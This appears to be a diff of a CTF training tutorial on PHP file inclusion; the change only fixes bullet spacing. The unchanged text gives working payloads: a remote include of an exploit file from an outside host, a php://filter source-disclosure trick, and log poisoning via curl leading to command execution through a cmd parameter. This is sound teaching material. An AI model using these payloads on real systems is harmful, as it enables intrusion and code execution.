@@ -420,14 +420,14 @@ Consider this PHP example:
 ```
 
 In this example, making use of the COLOR parameter, an attacker is able to specify an arbitrary file to be included.
-*vulnerable.php?color=<b>exploit.php</b> - Executes codes from an existing file in the server.
+* vulnerable.php?color=<b>exploit.php</b> - Executes codes from an existing file in the server.
 
 However, if the server was misconfigured, the vulnerability can become more critical.
 PHP misconfiguration: allow_url_include=on and allow_url_fopen=on
-*vulnerable.php?color=<b>http://www.nusgreyhats.org/exploit.php</b> - Injects a remotely hosted file containing malicious codes
+* vulnerable.php?color=<b>http://www.nusgreyhats.org/exploit.php</b> - Injects a remotely hosted file containing malicious codes
 
 Since PHP 5.0.0, an attacker is able to use the function PHP://filter/convert.base64-encode/resource to view the source code of any PHP file.
-*vulnerable.php?color=<b>php://filter/convert.base64-encode/resource=vulnerable</b> - View the source code of vulnerable.php in base64 encoding.
+* vulnerable.php?color=<b>php://filter/convert.base64-encode/resource=vulnerable</b> - View the source code of vulnerable.php in base64 encoding.
 With the base64 encoding of <b>vulnerable.php</b>, an attacker can decode the file and obtain the source code.
 
 ### Practical: Local File Inclusion
@@ -478,13 +478,13 @@ From login.php, we can tell that it'd be difficult to crack the ```$pwhash```. H
 Remember from ```index.php```, you are able to include log files? Got an idea of how to run arbitrary commands now?
 
 Let's first try to use the logging function to write some PHP code into the log file, and then run it using ```index.php```.
-*index.php?page=login&debug=1 - Username = nusgreyhats & Password = <?php echo "HAHA GOT YOU!"; ?>
+* index.php?page=login&debug=1 - Username = nusgreyhats & Password = <?php echo "HAHA GOT YOU!"; ?>
 Or
 ```curl -d "login=nusgreyhats&password=<?php echo \"HAHA GOT YOU!\"?>" "http://url/index.php?page=login&debug=1"```
 Remember to change the URL to the correct URL.
 
 Now let's browse to the log file to see if it is written accurately.
-*http://URL/nusgreyhats.log - You should see the PHP code you've specified being output.
+* http://URL/nusgreyhats.log - You should see the PHP code you've specified being output.
 
 Great! Now we can proceed to write PHP codes that allows use to run arbitrary commands.
 Write this to the log file:
@@ -501,12 +501,12 @@ Therefore, using passthru, we are able to enumerate directories.
 Now, using the ```index.php?log=nusgreyhats``` method, let's run some arbitrary commands.
 
 Let's first try to run a ```ls``` command.
-*http://URL/index.php?log=nusgreyhats&cmd=ls - You should be able to see the contents of the current working directory.
+* http://URL/index.php?log=nusgreyhats&cmd=ls - You should be able to see the contents of the current working directory.
 
 Now, we see the flag_ctf101.txt file located in the directory.
 
 Let's ```cat``` the file to see the contents.
-*http://URL/index.php?log=nusgreyhats&cmd=cat flag_ctf101.txt
+* http://URL/index.php?log=nusgreyhats&cmd=cat flag_ctf101.txt
 
 YAY we got the flag!
 
